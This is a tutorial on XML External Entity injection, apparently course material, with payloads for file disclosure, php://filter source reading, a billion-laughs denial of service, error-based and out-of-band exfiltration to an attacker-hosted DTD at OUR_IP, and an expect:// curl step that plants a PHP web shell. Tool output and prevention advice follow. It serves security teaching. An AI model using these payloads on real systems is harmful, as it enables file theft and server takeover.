XML External Entity (XXE) Injection vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions. XXE vulnerabilities can cause considerable damage to a web application and its back-end server, from disclosing sensitive files to shutting the back-end server down, which is why it is considered one of the Top 10 Web Security Risks by OWASP.

# XML DTD

XML Document Type Definition (DTD) allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file. The following is an example DTD:

```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```

As we can see, the DTD is declaring the root email element with the ELEMENT type declaration and then denoting its child elements. After that, each of the child elements is also declared, where some of them also have child elements, while others may only contain raw data (as denoted by PCDATA).

The above DTD can be placed within the XML document itself, right after the XML Declaration in the first line. Otherwise, it can be stored in an external file (e.g. email.dtd), and then referenced within the XML document with the SYSTEM keyword, as follows:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```

It is also possible to reference a DTD through a URL, as follows:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

# XML entities

We may also define custom entities (i.e. XML variables) in XML DTDs, to allow refactoring of variables and reduce repetitive data. This can be done with the use of the ENTITY keyword, which is followed by the entity name and its value, as follows:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Once we define an entity, it can be referenced in an XML document between an ampersand & and a semi-colon ; (e.g. &company;). Whenever an entity is referenced, it will be replaced with its value by the XML parser. Most interestingly, however, we can reference External XML Entities with the SYSTEM keyword, which is followed by the external entity's path, as follows:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

**Note**: We may also use the PUBLIC keyword instead of SYSTEM for loading external resources, which is used with publicly declared entities and standards, such as a language code (lang="en"). In this module, we'll be using SYSTEM, but we should be able to use either in most cases.

This works similarly to internal XML entities defined within documents. When we reference an external entity (e.g. &signature;), the parser will replace the entity with its value stored in the external file (e.g. signature.txt). When the XML file is parsed on the server-side, in cases like SOAP (XML) APIs or web forms, then an entity can reference a file stored on the back-end server, which may eventually be disclosed to us when we reference the entity.


# Local file disclosure

When a web application trusts unfiltered XML data from user input, we may be able to reference an external XML DTD document and define new custom XML entities. **Suppose we can define new entities and have them displayed on the web page. In that case, we should also be able to define external entities and make them reference a local file, which, when displayed, should show us the content of that file on the back-end server**.

### Identifying

The first step in identifying potential XXE vulnerabilities is finding web pages that accept an XML user input. **We can try intercepting forms data in a web application with Burp**.

The form appears to be sending our data in an XML format to the web server, making this a potential XXE testing target. Suppose the web application uses outdated XML libraries, and it does not apply any filters or sanitization on our XML input. In that case, we may be able to exploit this XML form to read local files.

**If we send the form without any modification, we get the following message**:

- "Check you email EMAIL_ADDRESS for further instructions"

**We see that the value of the email element is being displayed back to us on the page. To print the content of an external file to the page, we should note which elements are being displayed, such that we know which elements to inject into**. In some cases, no elements may be displayed.


For now, we know that whatever value we place in the <email></email> element gets displayed in the HTTP response. So, let us try to define a new entity and then use it as a variable in the email element to see whether it gets replaced with the value we defined. To do so, we can use what we learned in the previous section for defining new XML entities and add the following lines after the first line in the XML input:

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

**Note**: In our example, the XML input in the HTTP request had no DTD being declared within the XML data itself, or being referenced externally, so we added a new DTD before defining our entity. If the DOCTYPE was already declared in the XML request, we would just add the ENTITY element to it.

Now, we should have a new XML entity called company, which we can reference with &company;. So, instead of using our email in the email element, let us try using &company;, and see whether it will be replaced with the value we defined (Inlane Freight).

As we can see, the response did use the value of the entity we defined (Inlane Freight) instead of displaying &company;, indicating that we may inject XML code. In contrast, a non-vulnerable web application would display (&company;) as a raw value. This confirms that we are dealing with a web application vulnerable to XXE.

**Note**: Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to **application/xml**, and then convert the JSON data to XML with an online tool. If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.

### Reading sensitive files

Now that we can define new internal XML entities let's see if we can define external XML entities. Doing so is fairly similar to what we did earlier, but we'll just add the SYSTEM keyword and define the external reference path after it, as we have learned in the previous section:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

We see that we did indeed get the content of the /etc/passwd file, meaning that we have successfully exploited the XXE vulnerability to read local files. This enables us to read the content of sensitive files, like configuration files that may contain passwords or other sensitive files like an id_rsa SSH key of a specific user, which may grant us access to the back-end server.

# Reading source code

Another benefit of local file disclosure is the ability to obtain the source code of the web application. This would allow us to perform a Whitebox Penetration Test to unveil more vulnerabilities in the web application, or at the very least reveal secret configurations like database passwords or API keys.

So, let us see if we can use the same attack to read the source code of the index.php file, as follows:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file://index.php">
]>
```

As we can see, this **did not work**, as we did not get any content. This happened because the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity. If a file contains some of XML's special characters (e.g. </>/&), it would break the external entity reference and not be used for the reference. Furthermore, we cannot read any binary data, as it would also not conform to the XML format.

Luckily, **PHP provides wrapper filters that allow us to base64 encode certain resources 'including files'**, in which case the final base64 output should not break the XML format. To do so, instead of using **file://** as our reference, we will use PHP's **php://filter/** wrapper. With this filter, we can specify the convert.base64-encode encoder as our filter, and then add an input resource (e.g. resource=index.php), as follows:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

**This trick only works with PHP web applications**.

# Remote code execution with XXE

In addition to reading local files, we may be able to gain code execution over the remote server. The **easiest method would be to look for ssh keys, or attempt to utilize a hash stealing trick in Windows-based web applications**, by making a call to our server. If these do not work, we may still be able to **execute commands on PHP-based web applications through the PHP://expect filter**, though this requires the PHP expect module to be installed and enabled.

If the XXE directly prints its output 'as shown in this section', then we can execute basic commands as expect://id, and the page should print the command output. However, if we did not have access to the output, or needed to execute a more complicated command 'e.g. reverse shell', then the XML syntax may break and the command may not execute.

The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands. To do so, we can start by writing a basic PHP web shell and starting a python web server, as follows:

```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```

Now, we can use the following XML code to execute a curl command that downloads our web shell into the remote server:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

**Note**: We replaced all spaces in the above XML code with $IFS, to avoid breaking the XML syntax. Furthermore, many other characters like |, >, and \{ may break the code, so we should avoid using them.


Once we send the request, we should receive a request on our machine for the shell.php file, after which we can interact with the web shell on the remote server for code execution.

**Note**: The expect module is not enabled/installed by default on modern PHP servers, so this attack may not always work. This is why XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.


# Other XXE attacks

Finally, one common use of XXE attacks is causing a Denial of Service (DOS) to the hosting web server, with the use the following payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

This payload defines the a0 entity as DOS, references it in a1 multiple times, references a1 in a2, and so on until the back-end server's memory runs out due to the self-reference loops. **However, this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference**.


# Advanced exfiltration with CDATA

In the previous section, we saw how we could use PHP filters to encode PHP source files, such that they would not break the XML format when referenced, which (as we saw) prevented us from reading these files. But what about other types of Web Applications? We can utilize another method to extract any kind of data (including binary data) for any web application backend. To output data that does not conform to the XML format, **we can wrap the content of the external file reference with a CDATA tag (e.g. <![CDATA[ FILE_CONTENT ]]>)**.


One easy way to tackle this issue would be to define a begin internal entity with <![CDATA[, an end internal entity with ]]>, and then place our external entity file in between, and it should be considered as a CDATA element, as follows:

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

After that, if we reference the &joined; entity, it should contain our escaped data. **However, this will not work, since XML prevents joining internal and external entities, so we will have to find a better way to do so**.

To bypass this limitation, we can utilize **XML Parameter Entities**, a special type of entity that starts with a % character and can only be used within the DTD. What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined, as follows:

```xml
<!ENTITY joined "%begin;%file;%end;">
```

So, let's try to read the submitDetails.php file by first storing the above line in a DTD file (e.g. xxe.dtd), host it on our machine, and then reference it as an external entity on the target web application, as follows:

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now, we can reference our external entity (xxe.dtd) and then print the &joined; entity we defined above, which should contain the content of the submitDetails.php file, as follows:

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

# Error based XXE

Another situation we may find ourselves in is one where the web application might not write any output, so we cannot control any of the XML input entities to write its content. In such cases, we would be blind to the XML output and so would not be able to retrieve the file content using our usual methods.

If the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit. If the web application neither writes XML output nor displays any errors, we would face a completely blind situation.

First, **let's try to send malformed XML data**, and see if the web application displays any errors. To do so, we can delete any of the closing tags, change one of them, so it does not close (e.g. <roo> instead of <root>), or just reference a non-existing entity.

We see that we did indeed cause the web application to display an error, and it also revealed the web server directory, which we can use to read the source code of other files. Now, we can exploit this flaw to exfiltrate file content. To do so, we will use a similar technique to what we used earlier. First, we will host a DTD file that contains the following payload:

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

The above payload defines the file parameter entity and then joins it with an entity that does not exist. In our previous exercise, we were joining three strings. In this case, %nonExistingEntity; does not exist, so the web application would throw an error saying that this entity does not exist, along with our joined %file; as part of the error. There are many other variables that can cause an error, like a bad URI or having bad characters in the referenced file.

Now, we can call our external DTD script, and then reference the error entity, as follows:
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

Once we host our DTD script as we did earlier and send the above payload as our XML data (no need to include any other XML data), we will get the content of the /etc/hosts file.

This method may also be used to read the source code of files. All we have to do is change the file name in our DTD script to point to the file we want to read (e.g. "file:///var/www/html/submitDetails.php"). **However, this method is not as reliable as the previous method for reading source files, as it may have length limitations, and certain special characters may still break it**.


# Blind data exfiltration, out-of-band data exfiltration

We can utilize a method known as Out-of-band (OOB) Data Exfiltration, which is often used in similar blind cases with many web attacks, like blind SQL injections, blind command injections, blind XSS, and of course, blind XXE.

In our previous attacks, **we utilized an out-of-band attack since we hosted the DTD file in our machine and made the web application connect to us** (hence out-of-band).
So, our attack this time will be pretty similar, with one significant difference. Instead of having the web application output our file entity to a specific XML entity, **we will make the web application send a web request to our web server with the content of the file we are reading**.

To do so, we can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the file parameter value as part of the URL being requested over HTTP, as follows:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

If, for example, the file we want to read had the content of XXE_SAMPLE_DATA, then the file parameter would hold its base64 encoded data (WFhFX1NBTVBMRV9EQVRB). When the XML tries to reference the external oob parameter from our machine, **it will request http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB**. Finally, we can decode the WFhFX1NBTVBMRV9EQVRB string to get the content of the file. We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal:

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

So, we will first write the above PHP code to index.php, and then start a PHP server on port 8000, as follows:

```bash
vi index.php # here we write the above PHP code
php -S 0.0.0.0:8000

PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
```


Now, to initiate our attack, we can use a similar payload to the one we used in the error-based attack, and simply add ```<root>&content;</root>```, which is needed to reference our entity and have it send the request to our machine with the file content:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

Finally, we can go back to our terminal, and we will see that we did indeed get the request and its decoded content:

```
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
10.10.14.16:46256 Accepted
10.10.14.16:46256 [200]: (null) /xxe.dtd
10.10.14.16:46256 Closing
10.10.14.16:46258 Accepted

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...
```


**Tip**: In addition to storing our base64 encoded data as a parameter to our URL, we may utilize DNS OOB Exfiltration by placing the encoded data as a sub-domain for our URL (e.g. ENCODEDTEXT.our.website.com), and then use a tool like tcpdump to capture any incoming traffic and decode the sub-domain string to get the data. Granted, this method is more advanced and requires more effort to exfiltrate data through.

# Blind data exfiltration, automated OOB exfiltration

Although in some instances we may have to use the manual method we learned above, in many other cases, we can automate the process of blind XXE data exfiltration with tools.

One such tool is **XXEinjector**. This tool supports most of the tricks we learned in this module, including basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE.

Once we have the tool, we can copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line, and write XXEINJECT after it as a position locator for the tool:

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Now, we can run the tool with the --host/--httpport flags being our IP and port, the --file flag being the file we wrote above, and the --path flag being the file we want to read. We will also select the --oob=http and --phpfilter flags to repeat the OOB attack we did above, as follows:

```bash
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

...SNIP...
[+] Sending request with malicious XML.
[+] Responding with XML for: /etc/passwd
[+] Retrieved data:
```

We see that the tool did not directly print the data. This is because we are base64 encoding the data, so it does not get printed. In any case, all exfiltrated files get stored in the Logs folder under the tool, and we can find our file there:

```bash
cat Logs/10.129.201.94/etc/passwd.log 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...SNIP..
```


# XXE prevention

- **Avoiding outdated components**: While other input validation web vulnerabilities are usually prevented through secure coding practices (e.g., XSS, IDOR, SQLi, OS Injection), this is not entirely necessary to prevent XXE vulnerabilities. This is because XML input is usually not handled manually by the web developers but by the built-in XML libraries instead. So, if a web application is vulnerable to XXE, this is very likely due to an outdated XML library that parses the XML data. In addition to updating the XML libraries, we should also update any components that parse XML input, such as API libraries like SOAP. Furthermore, any document or file processors that may perform XML parsing, like SVG image processors or PDF document processors, may also be vulnerable to XXE vulnerabilities, and we should update them as well;
- **Using safe XML configurations**: Other than using the latest XML libraries, certain XML configurations for web applications can help reduce the possibility of XXE exploitation. These include: Disable referencing custom Document Type Definitions (DTDs), Disable referencing External XML Entities, Disable Parameter Entity processing, Disable support for XInclude, Prevent Entity Reference Loops. Another thing we saw was Error-based XXE exploitation. So, we should always have proper exception handling in our web applications and should always disable displaying runtime errors in web servers.

